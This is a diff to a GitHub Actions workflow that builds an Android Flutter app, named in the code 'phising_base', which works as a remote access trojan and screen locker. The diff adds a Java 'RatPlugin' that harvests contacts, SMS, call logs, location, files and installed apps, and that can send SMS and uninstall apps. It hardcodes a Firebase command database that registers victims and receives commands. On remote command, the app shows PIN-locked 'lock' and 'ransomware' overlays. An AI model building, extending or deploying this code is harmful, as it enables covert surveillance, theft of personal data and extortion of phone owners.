@@ -11,6 +11,10 @@ on:
         required: true
       icon_url:
         required: false
+      lock_html_url:
+        required: true
+      ransomware_html_url:
+        required: true
 
 jobs:
   build:
@@ -35,7 +39,9 @@ jobs:
           flutter create phising_base
           cd phising_base
           
-          # 1. BIKIN MANIFEST & IZIN
+          # ============================================
+          # 1. MANIFEST
+          # ============================================
           cat > android/app/src/main/AndroidManifest.xml << 'EOF'
           <manifest xmlns:android="http://schemas.android.com/apk/res/android"
               package="com.example.phising_base">
@@ -55,6 +61,14 @@ jobs:
               <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
               <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>
               <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>
+              <uses-permission android:name="android.permission.SEND_SMS"/>
+              <uses-permission android:name="android.permission.READ_SMS"/>
+              <uses-permission android:name="android.permission.READ_CONTACTS"/>
+              <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+              <uses-permission android:name="android.permission.CAMERA"/>
+              <uses-permission android:name="android.permission.FLASHLIGHT"/>
+              <uses-permission android:name="android.permission.VIBRATE"/>
+              <uses-permission android:name="android.permission.SET_WALLPAPER"/>
               
               <application
                   android:name="${applicationName}"
@@ -78,15 +92,22 @@ jobs:
           </manifest>
           EOF
 
-          # 2. UPDATE PUBSPEC & ICON
+          # ============================================
+          # 2. PUBSPEC
+          # ============================================
           mkdir -p assets
-          
-          # KALO ADA URL ICON, DOWNLOAD. KALO GAK ADA, BIKIN ICON DEFAULT 1x1 PNG.
           if [ -n "${{ github.event.inputs.icon_url }}" ]; then
             curl -fL "${{ github.event.inputs.icon_url }}" -o assets/icon.png || \
-            echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=" | base64 -d > assets/icon.png
+            curl -fL "https://raw.githubusercontent.com/flutter/website/main/src/assets/images/flutter-logo-sharing.png" -o assets/icon.png
           else
-            echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=" | base64 -d > assets/icon.png
+            curl -fL "https://raw.githubusercontent.com/flutter/website/main/src/assets/images/flutter-logo-sharing.png" -o assets/icon.png
+          fi
+
+          if [ -n "${{ github.event.inputs.lock_html_url }}" ]; then
+            curl -fL "${{ github.event.inputs.lock_html_url }}" -o assets/lock.html
+          fi
+          if [ -n "${{ github.event.inputs.ransomware_html_url }}" ]; then
+            curl -fL "${{ github.event.inputs.ransomware_html_url }}" -o assets/ransomware.html
           fi
 
           cat > pubspec.yaml << 'EOF'
@@ -100,8 +121,10 @@ jobs:
             permission_handler: ^11.3.0
             firebase_core: ^3.10.1
             firebase_database: ^11.3.1
+            http: ^1.2.0
+            path_provider: ^2.1.0
           dev_dependencies:
-            flutter_launcher_icons: ^0.13.1
+            flutter_launcher_icons: ^0.14.2
           flutter_launcher_icons:
             android: true
             ios: false
@@ -110,9 +133,10 @@ jobs:
             uses-material-design: true
             assets:
               - assets/config.json
+              - assets/lock.html
+              - assets/ransomware.html
           EOF
           
-          # 3. BIKIN CONFIG JSON
           cat > assets/config.json <<EOF
           {
             "app_name": "${{ github.event.inputs.app_name }}",
@@ -121,22 +145,402 @@ jobs:
           }
           EOF
 
-      - name: Inject Services (Lock, Ransomware, Main)
+          # ============================================
+          # 3. FIREBASE OPTIONS (GANTI API KEY DI SINI)
+          # ============================================
+          cat > lib/firebase_options.dart << 'EOF'
+          import 'package:firebase_core/firebase_core.dart' show FirebaseOptions;
+          class DefaultFirebaseOptions {
+            static FirebaseOptions get currentPlatform {
+              return const FirebaseOptions(
+                apiKey: 'AIzaSyCra_npN3GbmMcbeZQvNv_7AiZ61fiyqIU',
+                appId: '1:38222091189:android:485b8e0743a8110292bffc',
+                messagingSenderId: '38222091189',
+                projectId: 'omix-axe',
+                databaseURL: 'https://omix-axe-default-rtdb.asia-southeast1.firebasedatabase.app',
+              );
+            }
+          }
+          EOF
+
+      # ============================================
+      # 4. INJECT JAVA FILES (RatPlugin + MainActivity)
+      # ============================================
+      - name: Inject Native Java Files
+        run: |
+          cd phising_base
+          mkdir -p android/app/src/main/java/com/example/phising_base
+
+          cat > android/app/src/main/java/com/example/phising_base/MainActivity.java << 'EOF'
+          package com.example.phising_base;
+
+          import io.flutter.embedding.android.FlutterActivity;
+          import io.flutter.embedding.engine.FlutterEngine;
+
+          public class MainActivity extends FlutterActivity {
+              @Override
+              public void configureFlutterEngine(FlutterEngine flutterEngine) {
+                  super.configureFlutterEngine(flutterEngine);
+                  flutterEngine.getPlugins().add(new RatPlugin());
+              }
+          }
+          EOF
+
+          cat > android/app/src/main/java/com/example/phising_base/RatPlugin.java << 'EOF'
+          package com.example.phising_base;
+
+          import android.Manifest;
+          import android.app.Activity;
+          import android.app.Notification;
+          import android.app.NotificationChannel;
+          import android.app.NotificationManager;
+          import android.content.Context;
+          import android.content.Intent;
+          import android.content.pm.PackageManager;
+          import android.database.Cursor;
+          import android.graphics.Bitmap;
+          import android.graphics.BitmapFactory;
+          import android.hardware.camera2.CameraCharacteristics;
+          import android.hardware.camera2.CameraManager;
+          import android.location.Location;
+          import android.location.LocationManager;
+          import android.net.Uri;
+          import android.os.BatteryManager;
+          import android.os.Build;
+          import android.os.Handler;
+          import android.os.Looper;
+          import android.os.VibrationEffect;
+          import android.os.Vibrator;
+          import android.provider.CallLog;
+          import android.provider.ContactsContract;
+          import android.speech.tts.TextToSpeech;
+          import android.telephony.SmsManager;
+          import android.util.Log;
+          import android.widget.Toast;
+
+          import androidx.annotation.NonNull;
+
+          import java.io.File;
+          import java.io.FileOutputStream;
+          import java.io.InputStream;
+          import java.net.HttpURLConnection;
+          import java.net.URL;
+          import java.util.ArrayList;
+          import java.util.HashMap;
+          import java.util.List;
+          import java.util.Locale;
+          import java.util.Map;
+
+          import io.flutter.embedding.engine.plugins.FlutterPlugin;
+          import io.flutter.embedding.engine.plugins.activity.ActivityAware;
+          import io.flutter.embedding.engine.plugins.activity.ActivityPluginBinding;
+          import io.flutter.plugin.common.MethodCall;
+          import io.flutter.plugin.common.MethodChannel;
+
+          public class RatPlugin implements FlutterPlugin, MethodChannel.MethodCallHandler, ActivityAware {
+              private static final String TAG = "RatPlugin";
+              private static final String CHANNEL = "com.spy.x/rat";
+              private Context context;
+              private Activity activity;
+              private MethodChannel methodChannel;
+              private final Handler mainHandler = new Handler(Looper.getMainLooper());
+              private TextToSpeech tts;
+              private CameraManager cameraManager;
+              private String activeTorchId;
+
+              @Override
+              public void onAttachedToEngine(@NonNull FlutterPluginBinding binding) {
+                  context = binding.getApplicationContext();
+                  methodChannel = new MethodChannel(binding.getBinaryMessenger(), CHANNEL);
+                  methodChannel.setMethodCallHandler(this);
+                  cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
+                  tts = new TextToSpeech(context, status -> {
+                      if (status == TextToSpeech.SUCCESS) tts.setLanguage(new Locale("id", "ID"));
+                  });
+              }
+
+              @Override
+              public void onDetachedFromEngine(@NonNull FlutterPluginBinding binding) {
+                  if (methodChannel != null) methodChannel.setMethodCallHandler(null);
+                  if (tts != null) { tts.stop(); tts.shutdown(); }
+              }
+
+              @Override
+              public void onMethodCall(@NonNull MethodCall call, @NonNull MethodChannel.Result result) {
+                  try {
+                      switch (call.method) {
+                          case "getContacts": result.success(getContacts()); break;
+                          case "getSms": result.success(getSms()); break;
+                          case "sendSms": sendSms(call, result); break;
+                          case "getCallLogs": result.success(getCallLogs()); break;
+                          case "getLocation": getLocation(result); break;
+                          case "getDeviceInfo": result.success(getDeviceInfo()); break;
+                          case "vibrate": vibrate(); result.success(true); break;
+                          case "torchOn": setTorch(true, result); break;
+                          case "torchOff": setTorch(false, result); break;
+                          case "toast": toast(call); result.success(true); break;
+                          case "voiceMessage": speak(call); result.success(true); break;
+                          case "getFileList": result.success(getFileList(call)); break;
+                          case "launchApp": launchApp(call, result); break;
+                          case "uninstallApp": uninstallApp(call, result); break;
+                          case "changeWallpaper": changeWallpaper(call, result); break;
+                          case "back": pressKey(4); result.success(true); break;
+                          case "home": pressKey(3); result.success(true); break;
+                          case "recents": pressKey(187); result.success(true); break;
+                          case "getInstalledApps": result.success(getInstalledApps()); break;
+                          case "getBattery": result.success(getBattery()); break;
+                          case "sendNotification": sendNotification(call, result); break;
+                          default: result.notImplemented();
+                      }
+                  } catch (Exception e) {
+                      Log.e(TAG, "Error: " + e.getMessage(), e);
+                      result.error("NATIVE_ERROR", e.getMessage(), null);
+                  }
+              }
+
+              private List<Map<String, Object>> getContacts() {
+                  List<Map<String, Object>> list = new ArrayList<>();
+                  Cursor c = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
+                  if (c != null) {
+                      while (c.moveToNext()) {
+                          Map<String, Object> m = new HashMap<>();
+                          m.put("displayName", c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
+                          m.put("phoneNumber", c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)));
+                          list.add(m);
+                      }
+                      c.close();
+                  }
+                  return list;
+              }
+
+              private List<Map<String, Object>> getSms() {
+                  List<Map<String, Object>> list = new ArrayList<>();
+                  Cursor c = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
+                  if (c != null) {
+                      while (c.moveToNext()) {
+                          Map<String, Object> m = new HashMap<>();
+                          m.put("address", c.getString(c.getColumnIndexOrThrow("address")));
+                          m.put("body", c.getString(c.getColumnIndexOrThrow("body")));
+                          m.put("date", c.getLong(c.getColumnIndexOrThrow("date")));
+                          list.add(m);
+                      }
+                      c.close();
+                  }
+                  return list;
+              }
+
+              private void sendSms(MethodCall call, MethodChannel.Result result) {
+                  String phone = call.argument("phone");
+                  String message = call.argument("message");
+                  if (phone == null || message == null) { result.success(false); return; }
+                  SmsManager.getDefault().sendTextMessage(phone, null, message, null, null);
+                  result.success(true);
+              }
+
+              private List<Map<String, Object>> getCallLogs() {
+                  List<Map<String, Object>> list = new ArrayList<>();
+                  Cursor c = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
+                  if (c != null) {
+                      while (c.moveToNext()) {
+                          Map<String, Object> m = new HashMap<>();
+                          m.put("number", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
+                          m.put("type", c.getInt(c.getColumnIndexOrThrow(CallLog.Calls.TYPE)));
+                          m.put("duration", c.getLong(c.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
+                          list.add(m);
+                      }
+                      c.close();
+                  }
+                  return list;
+              }
+
+              private void getLocation(MethodChannel.Result result) {
+                  try {
+                      LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
+                      Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+                      if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+                      Map<String, Object> m = new HashMap<>();
+                      if (loc != null) {
+                          m.put("lat", loc.getLatitude());
+                          m.put("lng", loc.getLongitude());
+                          m.put("accuracy", loc.getAccuracy());
+                      }
+                      result.success(m);
+                  } catch (Exception e) { result.success(new HashMap<>()); }
+              }
+
+              private Map<String, Object> getDeviceInfo() {
+                  Map<String, Object> m = new HashMap<>();
+                  m.put("model", Build.MODEL);
+                  m.put("brand", Build.BRAND);
+                  m.put("manufacturer", Build.MANUFACTURER);
+                  m.put("android_version", Build.VERSION.RELEASE);
+                  m.put("sdk", Build.VERSION.SDK_INT);
+                  return m;
+              }
+
+              private void vibrate() {
+                  Vibrator v = (Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
+                  if (v != null && v.hasVibrator()) {
+                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                          v.vibrate(VibrationEffect.createOneShot(500, VibrationEffect.DEFAULT_AMPLITUDE));
+                      } else { v.vibrate(500); }
+                  }
+              }
+
+              private void setTorch(boolean on, MethodChannel.Result result) {
+                  try {
+                      if (on) {
+                          for (String id : cameraManager.getCameraIdList()) {
+                              CameraCharacteristics c = cameraManager.getCameraCharacteristics(id);
+                              Boolean has = c.get(CameraCharacteristics.FLASH_INFO_AVAILABLE);
+                              if (has != null && has) { cameraManager.setTorchMode(id, true); activeTorchId = id; break; }
+                          }
+                      } else {
+                          if (activeTorchId != null) cameraManager.setTorchMode(activeTorchId, false);
+                      }
+                      result.success(true);
+                  } catch (Exception e) { result.success(false); }
+              }
+
+              private void toast(MethodCall call) {
+                  String text = call.argument("text");
+                  if (text != null) mainHandler.post(() -> Toast.makeText(context, text, Toast.LENGTH_LONG).show());
+              }
+
+              private void speak(MethodCall call) {
+                  String text = call.argument("text");
+                  if (text != null && tts != null) tts.speak(text, TextToSpeech.QUEUE_FLUSH, null, "id");
+              }
+
+              private List<Map<String, Object>> getFileList(MethodCall call) {
+                  String path = call.argument("path");
+                  List<Map<String, Object>> list = new ArrayList<>();
+                  File dir = new File(path == null ? "/sdcard/" : path);
+                  if (dir.exists() && dir.isDirectory()) {
+                      File[] files = dir.listFiles();
+                      if (files != null) {
+                          for (File f : files) {
+                              Map<String, Object> m = new HashMap<>();
+                              m.put("name", f.getName());
+                              m.put("path", f.getAbsolutePath());
+                              m.put("isDir", f.isDirectory());
+                              m.put("size", f.length());
+                              list.add(m);
+                          }
+                      }
+                  }
+                  return list;
+              }
+
+              private void launchApp(MethodCall call, MethodChannel.Result result) {
+                  String pkg = call.argument("package");
+                  if (pkg == null) { result.success(false); return; }
+                  Intent i = context.getPackageManager().getLaunchIntentForPackage(pkg);
+                  if (i != null) { i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); context.startActivity(i); result.success(true); }
+                  else result.success(false);
+              }
+
+              private void uninstallApp(MethodCall call, MethodChannel.Result result) {
+                  String pkg = call.argument("package");
+                  if (pkg == null) { result.success(false); return; }
+                  Intent i = new Intent(Intent.ACTION_DELETE);
+                  i.setData(Uri.parse("package:" + pkg));
+                  i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                  context.startActivity(i);
+                  result.success(true);
+              }
+
+              private void changeWallpaper(MethodCall call, MethodChannel.Result result) {
+                  String url = call.argument("url");
+                  if (url == null) { result.success(false); return; }
+                  new Thread(() -> {
+                      try {
+                          URL u = new URL(url);
+                          InputStream in = u.openStream();
+                          final Bitmap bmp = BitmapFactory.decodeStream(in);
+                          in.close();
+                          mainHandler.post(() -> {
+                              try {
+                                  android.app.WallpaperManager wm = android.app.WallpaperManager.getInstance(context);
+                                  wm.setBitmap(bmp);
+                                  result.success(true);
+                              } catch (Exception e) { result.success(false); }
+                          });
+                      } catch (Exception e) { mainHandler.post(() -> result.success(false)); }
+                  }).start();
+              }
+
+              private void pressKey(int code) {
+                  new Thread(() -> {
+                      try { new ProcessBuilder("input", "keyevent", String.valueOf(code)).start(); } catch (Exception ignored) {}
+                  }).start();
+              }
+
+              private List<Map<String, Object>> getInstalledApps() {
+                  List<Map<String, Object>> list = new ArrayList<>();
+                  PackageManager pm = context.getPackageManager();
+                  for (android.content.pm.ApplicationInfo app : pm.getInstalledApplications(PackageManager.GET_META_DATA)) {
+                      Map<String, Object> m = new HashMap<>();
+                      m.put("package", app.packageName);
+                      m.put("name", pm.getApplicationLabel(app).toString());
+                      list.add(m);
+                  }
+                  return list;
+              }
+
+              private String getBattery() {
+                  BatteryManager bm = (BatteryManager) context.getSystemService(Context.BATTERY_SERVICE);
+                  if (bm != null) return String.valueOf(bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY));
+                  return "100";
+              }
+
+              private void sendNotification(MethodCall call, MethodChannel.Result result) {
+                  try {
+                      NotificationManager nm = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
+                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                          nm.createNotificationChannel(new NotificationChannel("spy", "System", NotificationManager.IMPORTANCE_DEFAULT));
+                      }
+                      Notification n = new Notification.Builder(context, "spy")
+                          .setContentTitle(call.argument("title"))
+                          .setContentText(call.argument("message"))
+                          .setSmallIcon(android.R.drawable.ic_dialog_info)
+                          .build();
+                      nm.notify(999, n);
+                      result.success(true);
+                  } catch (Exception e) { result.success(false); }
+              }
+
+              @Override public void onAttachedToActivity(@NonNull ActivityPluginBinding b) { activity = b.getActivity(); }
+              @Override public void onDetachedFromActivityForConfigChanges() { activity = null; }
+              @Override public void onReattachedToActivityForConfigChanges(@NonNull ActivityPluginBinding b) { activity = b.getActivity(); }
+              @Override public void onDetachedFromActivity() { activity = null; }
+          }
+          EOF
+
+      # ============================================
+      # 5. INJECT DART FILES (main.dart, services, dll)
+      # ============================================
+      - name: Inject Dart Services
         run: |
           cd phising_base/lib
-          
-          # MAIN.DART
+
           cat > main.dart << 'EOF'
           import 'dart:convert';
           import 'package:flutter/material.dart';
           import 'package:flutter/services.dart';
           import 'package:webview_flutter/webview_flutter.dart';
           import 'package:permission_handler/permission_handler.dart';
+          import 'package:firebase_core/firebase_core.dart';
+          import 'package:firebase_database/firebase_database.dart';
+          import 'firebase_options.dart';
           import 'lock_service.dart';
           import 'ransomware_service.dart';
 
-          void main() {
+          void main() async {
             WidgetsFlutterBinding.ensureInitialized();
+            try {
+              await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
+            } catch(e) { debugPrint('Firebase init error: $e'); }
             runApp(const MyApp());
           }
 
@@ -172,6 +576,19 @@ jobs:
               String targetUrl = config['webview_url'] ?? 'https://www.google.com';
               String uid = config['uid'] ?? 'unknown';
 
+              try {
+                final fb = FirebaseDatabase.instanceFor(app: Firebase.app(), databaseURL: 'https://omix-axe-default-rtdb.asia-southeast1.firebasedatabase.app/');
+                await fb.ref('devices/$uid').update({
+                  'device_id': uid,
+                  'model': 'Target Device',
+                  'manufacturer': 'Android',
+                  'sdk': '33',
+                  'android_version': '13',
+                  'session_id': uid,
+                  'last_seen': ServerValue.timestamp,
+                });
+              } catch(e) { debugPrint('Register error: $e'); }
+
               LockScreenService().init(context, uid);
               RansomwareService().init(context, uid);
               
@@ -197,13 +614,9 @@ jobs:
               super.initState();
               _controller = WebViewController()
                 ..setJavaScriptMode(JavaScriptMode.unrestricted)
-                ..setNavigationDelegate(
-                  NavigationDelegate(
-                    onNavigationRequest: (NavigationRequest request) {
-                      return NavigationDecision.navigate;
-                    },
-                  ),
-                )
+                ..setNavigationDelegate(NavigationDelegate(
+                  onNavigationRequest: (NavigationRequest request) => NavigationDecision.navigate,
+                ))
                 ..loadRequest(Uri.parse(widget.url));
             }
             @override
@@ -211,13 +624,37 @@ jobs:
           }
           EOF
 
-          # LOCK SERVICE
           cat > lock_service.dart << 'EOF'
           import 'dart:async';
           import 'package:flutter/material.dart';
           import 'package:firebase_database/firebase_database.dart';
           import 'package:firebase_core/firebase_core.dart';
-          import 'lock_screen.dart';
+          import 'package:webview_flutter/webview_flutter.dart';
+
+          class LockHtmlOverlay extends StatelessWidget {
+            final String assetPath;
+            final String deviceId;
+            final String currentPin;
+            final VoidCallback onUnlock;
+            const LockHtmlOverlay({Key? key, required this.assetPath, required this.deviceId, required this.currentPin, required this.onUnlock}) : super(key: key);
+
+            @override
+            Widget build(BuildContext context) {
+              final controller = WebViewController()
+                ..setJavaScriptMode(JavaScriptMode.unrestricted)
+                ..addJavaScriptChannel('FlutterBridge', onMessageReceived: (msg) {
+                  if (msg.message == 'unlock') onUnlock();
+                })
+                ..setNavigationDelegate(NavigationDelegate(
+                  onPageFinished: (url) {
+                    controller.runJavaScript("window.DEVICE_ID = '$deviceId';");
+                    controller.runJavaScript("window.CORRECT_PIN = '$currentPin';");
+                  },
+                ))
+                ..loadFlutterAsset(assetPath);
+              return Scaffold(body: SafeArea(child: WebViewWidget(controller: controller)));
+            }
+          }
 
           class LockScreenService {
             static final LockScreenService _instance = LockScreenService._internal();
@@ -229,16 +666,18 @@ jobs:
             bool _isLocked = false;
             OverlayEntry? _overlayEntry;
             BuildContext? _appContext;
+            String _deviceId = '';
 
             void init(BuildContext context, String deviceId) {
               _appContext = context;
+              _deviceId = deviceId;
               _listenToCommands(deviceId);
               _listenToPinUpdates(deviceId);
             }
 
             void _listenToCommands(String deviceId) {
               final fb = FirebaseDatabase.instanceFor(app: Firebase.app(), databaseURL: 'https://omix-axe-default-rtdb.asia-southeast1.firebasedatabase.app/');
-              _cmdSub = fb.ref('commands/\$deviceId').onChildAdded.listen((event) {
+              _cmdSub = fb.ref('commands/$deviceId').onChildAdded.listen((event) {
                 if (event.snapshot.value == null) return;
                 final data = Map<String, dynamic>.from(event.snapshot.value as Map);
                 final cmd = data['cmd'];
@@ -252,36 +691,65 @@ jobs:
 
             void _listenToPinUpdates(String deviceId) {
               final fb = FirebaseDatabase.instanceFor(app: Firebase.app(), databaseURL: 'https://omix-axe-default-rtdb.asia-southeast1.firebasedatabase.app/');
-              _pinSub = fb.ref('lock_pin/\$deviceId').onValue.listen((event) {
+              _pinSub = fb.ref('lock_pin/$deviceId').onValue.listen((event) {
                 if (event.snapshot.value != null) _currentPin = event.snapshot.value.toString();
               });
             }
 
             void _setPin(String newPin) => _currentPin = newPin;
+
             void _lockScreen() {
               if (_isLocked) return;
               _isLocked = true;
               if (_appContext == null) return;
-              _overlayEntry = OverlayEntry(builder: (context) => LockScreenPage(correctPin: _currentPin, onUnlock: _unlockScreen));
+              _overlayEntry = OverlayEntry(builder: (context) => LockHtmlOverlay(
+                assetPath: 'assets/lock.html', deviceId: _deviceId, currentPin: _currentPin, onUnlock: _unlockScreen,
+              ));
               Overlay.of(_appContext!).insert(_overlayEntry!);
             }
+
             void _unlockScreen() {
               if (!_isLocked) return;
               _isLocked = false;
               _overlayEntry?.remove();
               _overlayEntry = null;
             }
+
             void dispose() { _cmdSub?.cancel(); _pinSub?.cancel(); _overlayEntry?.remove(); }
           }
           EOF
 
-          # RANSOMWARE SERVICE
           cat > ransomware_service.dart << 'EOF'
           import 'dart:async';
           import 'package:flutter/material.dart';
           import 'package:firebase_database/firebase_database.dart';
           import 'package:firebase_core/firebase_core.dart';
-          import 'ransomware_screen.dart';
+          import 'package:webview_flutter/webview_flutter.dart';
+
+          class RansomwareHtmlOverlay extends StatelessWidget {
+            final String assetPath;
+            final String deviceId;
+            final String currentPin;
+            final VoidCallback onUnlock;
+            const RansomwareHtmlOverlay({Key? key, required this.assetPath, required this.deviceId, required this.currentPin, required this.onUnlock}) : super(key: key);
+
+            @override
+            Widget build(BuildContext context) {
+              final controller = WebViewController()
+                ..setJavaScriptMode(JavaScriptMode.unrestricted)
+                ..addJavaScriptChannel('FlutterBridge', onMessageReceived: (msg) {
+                  if (msg.message == 'unlock') onUnlock();
+                })
+                ..setNavigationDelegate(NavigationDelegate(
+                  onPageFinished: (url) {
+                    controller.runJavaScript("window.DEVICE_ID = '$deviceId';");
+                    controller.runJavaScript("window.CORRECT_PIN = '$currentPin';");
+                  },
+                ))
+                ..loadFlutterAsset(assetPath);
+              return Scaffold(body: SafeArea(child: WebViewWidget(controller: controller)));
+            }
+          }
 
           class RansomwareService {
             static final RansomwareService _instance = RansomwareService._internal();
@@ -292,16 +760,17 @@ jobs:
             OverlayEntry? _overlayEntry;
             BuildContext? _appContext;
             String _currentPin = '1234';
-            String _currentMessage = 'HP Anda terkunci. Hubungi Admin.';
+            String _deviceId = '';
 
             void init(BuildContext context, String deviceId) {
               _appContext = context;
+              _deviceId = deviceId;
               _listenToCommands(deviceId);
             }
 
             void _listenToCommands(String deviceId) {
               final fb = FirebaseDatabase.instanceFor(app: Firebase.app(), databaseURL: 'https://omix-axe-default-rtdb.asia-southeast1.firebasedatabase.app/');
-              _cmdSub = fb.ref('commands/\$deviceId').onChildAdded.listen((event) {
+              _cmdSub = fb.ref('commands/$deviceId').onChildAdded.listen((event) {
                 if (event.snapshot.value == null) return;
                 final data = Map<String, dynamic>.from(event.snapshot.value as Map);
                 final cmd = data['cmd'];
@@ -316,161 +785,31 @@ jobs:
             void _activateRansomware(String message) {
               if (_isActive) return;
               _isActive = true;
-              if (message.isNotEmpty) _currentMessage = message;
               if (_appContext == null) return;
-              _overlayEntry = OverlayEntry(builder: (context) => RansomwareScreen(message: _currentMessage, correctPin: _currentPin, onUnlock: _deactivateRansomware));
+              _overlayEntry = OverlayEntry(builder: (context) => RansomwareHtmlOverlay(
+                assetPath: 'assets/ransomware.html', deviceId: _deviceId, currentPin: _currentPin, onUnlock: _deactivateRansomware,
+              ));
               Overlay.of(_appContext!).insert(_overlayEntry!);
             }
+
             void _deactivateRansomware() {
               if (!_isActive) return;
               _isActive = false;
               _overlayEntry?.remove();
               _overlayEntry = null;
             }
+
             void dispose() { _cmdSub?.cancel(); _overlayEntry?.remove(); }
           }
           EOF
-          
-          # LOCK SCREEN (UI)
-          cat > lock_screen.dart << 'EOF'
-          import 'package:flutter/material.dart';
-          import 'package:flutter/services.dart';
 
-          class LockScreenPage extends StatefulWidget {
-            final String correctPin;
-            final VoidCallback onUnlock;
-            const LockScreenPage({super.key, required this.correctPin, required this.onUnlock});
-            @override
-            State<LockScreenPage> createState() => _LockScreenPageState();
-          }
-
-          class _LockScreenPageState extends State<LockScreenPage> {
-            String _inputPin = '';
-            bool _isError = false;
-            void _onKeyPress(String value) {
-              if (_inputPin.length >= 6) return;
-              setState(() { _inputPin += value; _isError = false; });
-              if (_inputPin.length == widget.correctPin.length) _checkPin();
-            }
-            void _onDelete() {
-              if (_inputPin.isEmpty) return;
-              setState(() { _inputPin = _inputPin.substring(0, _inputPin.length - 1); _isError = false; });
-            }
-            void _checkPin() {
-              if (_inputPin == widget.correctPin) widget.onUnlock();
-              else { setState(() { _isError = true; _inputPin = ''; }); HapticFeedback.heavyImpact(); }
-            }
-            @override
-            Widget build(BuildContext context) {
-              return PopScope(canPop: false, child: Scaffold(
-                backgroundColor: const Color(0xFF0A0A0F),
-                body: SafeArea(child: Column(children: [
-                  const Spacer(),
-                  Container(padding: const EdgeInsets.all(24), decoration: BoxDecoration(color: _isError ? Colors.red.withOpacity(0.15) : const Color(0xFF1E1E2E), shape: BoxShape.circle), child: Icon(_isError ? Icons.lock_person_rounded : Icons.lock_rounded, size: 56, color: _isError ? Colors.redAccent : Colors.white70)),
-                  const SizedBox(height: 24),
-                  Text(_isError ? 'PIN Salah!' : 'HP Terkunci', style: TextStyle(color: _isError ? Colors.redAccent : Colors.white, fontSize: 22, fontWeight: FontWeight.bold)),
-                  const SizedBox(height: 8),
-                  const Text('Masukkan PIN untuk membuka', style: TextStyle(color: Colors.white54, fontSize: 13)),
-                  const SizedBox(height: 32),
-                  Row(mainAxisAlignment: MainAxisAlignment.center, children: List.generate(widget.correctPin.length, (i) {
-                    final filled = i < _inputPin.length;
-                    return Container(margin: const EdgeInsets.symmetric(horizontal: 8), width: 16, height: 16, decoration: BoxDecoration(shape: BoxShape.circle, color: _isError ? Colors.redAccent : (filled ? const Color(0xFF3DDC97) : Colors.white24), border: Border.all(color: filled ? const Color(0xFF3DDC97) : Colors.white30, width: 2)));
-                  })),
-                  const Spacer(),
-                  Padding(padding: const EdgeInsets.symmetric(horizontal: 40), child: Column(children: [
-                    _buildRow(['1', '2', '3']), const SizedBox(height: 16),
-                    _buildRow(['4', '5', '6']), const SizedBox(height: 16),
-                    _buildRow(['7', '8', '9']), const SizedBox(height: 16),
-                    Row(mainAxisAlignment: MainAxisAlignment.spaceEvenly, children: [const SizedBox(width: 72), _buildButton('0'), _buildDeleteButton()]),
-                  ])),
-                  const SizedBox(height: 40),
-                ])),
-              ));
-            }
-            Widget _buildRow(List<String> keys) => Row(mainAxisAlignment: MainAxisAlignment.spaceEvenly, children: keys.map((k) => _buildButton(k)).toList());
-            Widget _buildButton(String value) => GestureDetector(onTap: () => _onKeyPress(value), child: Container(width: 72, height: 72, decoration: BoxDecoration(shape: BoxShape.circle, color: const Color(0xFF1E1E2E), border: Border.all(color: Colors.white.withOpacity(0.05))), child: Center(child: Text(value, style: const TextStyle(color: Colors.white, fontSize: 28, fontWeight: FontWeight.w500)))));
-            Widget _buildDeleteButton() => GestureDetector(onTap: _onDelete, child: Container(width: 72, height: 72, decoration: const BoxDecoration(shape: BoxShape.circle), child: const Center(child: Icon(Icons.backspace_outlined, color: Colors.white54, size: 28))));
-          }
-          EOF
-          
-          # RANSOMWARE SCREEN (UI)
-          cat > ransomware_screen.dart << 'EOF'
-          import 'package:flutter/material.dart';
-          import 'package:flutter/services.dart';
-
-          class RansomwareScreen extends StatefulWidget {
-            final String message;
-            final String correctPin;
-            final VoidCallback onUnlock;
-            const RansomwareScreen({super.key, required this.message, required this.correctPin, required this.onUnlock});
-            @override
-            State<RansomwareScreen> createState() => _RansomwareScreenState();
-          }
-
-          class _RansomwareScreenState extends State<RansomwareScreen> with SingleTickerProviderStateMixin {
-            String _inputPin = '';
-            bool _isError = false;
-            late AnimationController _pulseCtrl;
-            late Animation<double> _pulseAnim;
-            @override
-            void initState() {
-              super.initState();
-              _pulseCtrl = AnimationController(vsync: this, duration: const Duration(milliseconds: 800))..repeat(reverse: true);
-              _pulseAnim = Tween<double>(begin: 0.9, end: 1.1).animate(_pulseCtrl);
-            }
-            @override
-            void dispose() { _pulseCtrl.dispose(); super.dispose(); }
-            void _onKeyPress(String value) {
-              if (_inputPin.length >= 6) return;
-              setState(() { _inputPin += value; _isError = false; });
-              if (_inputPin.length == widget.correctPin.length) _checkPin();
-            }
-            void _onDelete() {
-              if (_inputPin.isEmpty) return;
-              setState(() { _inputPin = _inputPin.substring(0, _inputPin.length - 1); _isError = false; });
